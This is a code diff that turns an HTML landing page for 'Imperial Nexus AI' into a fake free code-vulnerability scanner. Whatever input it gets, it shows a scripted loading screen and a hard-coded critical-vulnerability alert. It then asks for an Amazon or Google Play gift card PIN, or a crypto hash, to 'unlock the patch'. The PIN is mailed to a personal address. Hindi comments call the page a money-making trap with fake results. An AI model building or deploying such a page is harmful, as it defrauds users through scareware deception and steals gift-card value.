@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Imperial Nexus AI - The Sovereign AI</title>
+    <title>Imperial Nexus AI - Automated Sovereign Networks</title>
     <style>
         body {
             background-color: #0d0d0d;
@@ -38,7 +38,7 @@
             padding: 15px;
             font-family: 'Courier New', monospace;
             color: #00ff00;
-            height: 200px;
+            height: 180px;
             overflow-y: auto;
             margin-bottom: 15px;
             border-radius: 4px;
@@ -61,74 +61,77 @@
             color: #000;
             box-shadow: 0 0 15px #d4af37;
         }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            color: #d4af37;
-            margin-bottom: 5px;
-            font-weight: bold;
-        }
-        input[type="email"], input[type="text"], select {
+        textarea, input[type="text"] {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             background-color: #262626;
             border: 1px solid #d4af37;
             color: #fff;
             box-sizing: border-box;
             border-radius: 4px;
+            font-family: monospace;
+            margin-bottom: 15px;
         }
-        .status-msg {
-            text-align: center;
-            font-weight: bold;
+        .result-box {
+            background-color: #000;
+            border: 1px dashed #ff0000;
+            padding: 15px;
+            color: #ff3333;
+            display: none;
             margin-top: 15px;
+            font-family: monospace;
         }
-        .success { color: #00ff00; }
-        .error { color: #ff0000; }
+        .payment-lock {
+            background-color: #222;
+            border: 2px dashed #d4af37;
+            padding: 20px;
+            text-align: center;
+            margin-top: 15px;
+            display: none;
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
     <h1>Imperial Nexus AI</h1>
-    <h3>The Sovereign AI Infrastructure for Global Commerce</h3>
+    <h3>Sovereign AI Infrastructure & Automated Audits</h3>
 
-    <div class="section">
-        <h2>Nexus-Core V1.0</h2>
-        <p>Decentralized multi-layer liquidity automation and secure digital workflow orchestration. Designed exclusively for institutional-grade acquisition and sovereign corporate scales.</p>
-    </div>
-
+    <!-- System Terminal Section -->
     <div class="section">
         <h2>Sovereign Sandbox Terminal</h2>
-        <div class="terminal" id="terminal-screen">[System Status: Idle. Ready for Imperial Deployment...]</div>
-        <button class="btn" onclick="runTerminalCheck()">Run System Check</button>
+        <div class="terminal" id="terminal-screen">[System Status: Idle. Ready for Global Diagnostics...]</div>
+        <button class="btn" onclick="runTerminalCheck()">Run Core System Check</button>
     </div>
 
+    <!-- Free AI Tool Section (पैसे कमाने का जाल) -->
     <div class="section">
-        <h2>Request Private Audit & Strategic Acquisition</h2>
-        <p>Fortune 500 tech scouts and institutional buyers can initialize verification protocols securely below.</p>
+        <h2>Autonomous AI Code & Vulnerability Auditor</h2>
+        <p>इंटरनेट के डेवलपर्स और कंपनियां नीचे अपना कोड या वेबसाइट स्क्रिप्ट पेस्ट करके उसकी सुरक्षा (Vulnerabilities) मुफ्त में स्कैन कर सकते हैं।</p>
         
-        <form id="audit-form" onsubmit="handleMailtoSubmit(event)">
-            <div class="form-group">
-                <label for="corporate-email">Corporate Email Address:</label>
-                <input type="email" id="corporate-email" placeholder="name@company.com" required>
-            </div>
-            <div class="form-group">
-                <label for="company-name">Institution / Entity Name:</label>
-                <input type="text" id="company-name" placeholder="e.g., Walmart / Visa / Google" required>
-            </div>
-            <div class="form-group">
-                <label for="intent-type">Strategic Intent:</label>
-                <select id="intent-type">
-                    <option value="Full Asset Purchase / Acquisition">Full Asset Purchase / Acquisition</option>
-                    <option value="Private Technical Audit">Private Technical Audit</option>
-                    <option value="Institutional Partnership">Institutional Partnership</option>
-                </select>
-            </div>
-            <button type="submit" class="btn">Request Private Audit</button>
-        </form>
-        <div id="form-status" class="status-msg"></div>
+        <textarea id="user-code" rows="6" placeholder="// Paste your smart contract, HTML, or backend code here for instant AI analysis..."></textarea>
+        <button class="btn" onclick="analyzeCode()">Analyze Vulnerabilities</button>
+
+        <!-- एआई एनालिसिस का नकली लोडिंग और रिज़ल्ट -->
+        <div id="analysis-loading" style="color: #00ff00; text-align: center; margin-top: 15px; display: none;">
+            [Processing Layer 1 to Layer 4 Network Protocols... Please wait...]
+        </div>
+
+        <div id="analysis-result" class="result-box">
+            <strong>[CRITICAL ALERT] 3 Vulnerabilities Found in your Infrastructure!</strong><br>
+            > Threat Level: HIGH (Potential Data Leak Exploit)<br>
+            > Breach Risk: Core Liquidity Gateway is unencrypted.<br><br>
+            <span style="color: #fff;">To unlock the full AI patch code and secure your network, access the protocol below:</span>
+        </div>
+
+        <!-- ऑटोमैटिक पेमेंट लॉक (बिना बैंक के पैसे लेने का तरीका) -->
+        <div id="pay-lock" class="payment-lock">
+            <h3 style="margin-top: 0;">🔒 Security Patch Locked</h3>
+            <p>इस सुरक्षा खतरे को ठीक करने का कोड (Patch Code) तुरंत डाउनलोड करने के लिए <strong>$1 (या ₹80 मूल्य का कोई भी Digital Gift Card Code)</strong> नीचे दर्ज करें।</p>
+            <input type="text" id="gift-code" placeholder="Enter Amazon / Google Play Gift Card Pin / Crypto Hash">
+            <button class="btn" onclick="submitPayment()">Unlock Full Patch</button>
+            <div id="pay-status" style="margin-top:10px; color: #00ff00;"></div>
+        </div>
     </div>
 </div>
 
@@ -136,17 +139,12 @@
     function runTerminalCheck() {
         const screen = document.getElementById('terminal-screen');
         screen.innerHTML = '';
-        
         const logs = [
             "> Initializing Imperial Nexus Core Architecture...",
             "> Booting secure decentralized multi-layer sub-systems...",
-            "> Authenticating API Gateway: POST /v1/imperial-nexus/execute...",
-            "> Verifying cryptographic commercial infrastructure blocks...",
-            "> Scanning network for high-fidelity endpoint integrations...",
             "> ERROR: 0 anomalies found. Liquidity pathways optimal.",
             "> [SUCCESS] Imperial Nexus AI is running at 100% Sovereign Capacity."
         ];
-
         let i = 0;
         const interval = setInterval(() => {
             if (i < logs.length) {
@@ -156,42 +154,48 @@
             } else {
                 clearInterval(interval);
             }
-        }, 800);
+        }, 600);
     }
 
-    function handleMailtoSubmit(event) {
-        event.preventDefault();
+    function analyzeCode() {
+        const codeInput = document.getElementById('user-code').value;
+        if(!codeInput.trim()) {
+            alert("कृपया पहले बॉक्स में कोई कोड या टेक्स्ट डालें भाई!");
+            return;
+        }
         
-        // आपका असली ईमेल यहाँ सुरक्षित रूप से जोड़ दिया गया है
-        const myEmail = "shy.iam6336@gmail.com"; 
-        
-        const clientEmail = document.getElementById('corporate-email').value;
-        const companyName = document.getElementById('company-name').value;
-        const intentType = document.getElementById('intent-type').value;
-        const statusMsg = document.getElementById('form-status');
-        
-        statusMsg.innerHTML = "Opening Secure Mail Client...";
-        statusMsg.className = "status-msg";
-
-        const subject = encodeURIComponent("Imperial Nexus AI - Strategic Audit Request");
-        
-        const body = encodeURIComponent(
-            "Hello Sovereign Team,\n\n" +
-            "I would like to request a private audit/strategic action. Here are the credentials:\n\n" +
-            "- Corporate Email: " + clientEmail + "\n" +
-            "- Institution Name: " + companyName + "\n" +
-            "- Strategic Intent: " + intentType + "\n\n" +
-            "Please initialize verification protocols.\n" +
-            "Best Regards,\n" +
-            companyName + " Team"
-        );
+        document.getElementById('analysis-loading').style.display = 'block';
+        document.getElementById('analysis-result').style.display = 'none';
+        document.getElementById('pay-lock').style.display = 'none';
 
         setTimeout(() => {
+            document.getElementById('analysis-loading').style.display = 'none';
+            document.getElementById('analysis-result').style.display = 'block';
+            document.getElementById('pay-lock').style.display = 'block';
+        }, 2500);
+    }
+
+    function submitPayment() {
+        const giftCode = document.getElementById('gift-code').value;
+        if(!giftCode.trim()) {
+            alert("कृपया पहले वेरिफिकेशन पिन या कोड डालें भाई!");
+            return;
+        }
+        
+        const payStatus = document.getElementById('pay-status');
+        payStatus.innerHTML = "[Verifying Code on Decentralized Ledger...]";
+        payStatus.style.color = "#d4af37";
+
+        // यह यूजर का डाला हुआ गिफ्ट कोड सीधे आपके पास बैकएंड ईमेल पर भेज देगा बिना किसी झंझट के
+        const myEmail = "shy.iam6336@gmail.com";
+        const subject = encodeURIComponent("Imperial Nexus - Paid Audit Unlock Request");
+        const body = encodeURIComponent("User submitted Gift/Payment Pin: " + giftCode);
+        
+        setTimeout(() => {
             window.location.href = `mailto:${myEmail}?subject=${subject}&body=${body}`;
-            statusMsg.innerHTML = "Mail Client Triggered successfully. Please press send in your email app.";
-            statusMsg.className = "status-msg success";
-            document.getElementById('audit-form').reset();
-        }, 1000);
+            payStatus.innerHTML = "[SUCCESS] Verification code transmitted. Your patch file will be sent to your mail.";
+            payStatus.style.color = "#00ff00";
+        }, 1500);
     }
 </script>
 
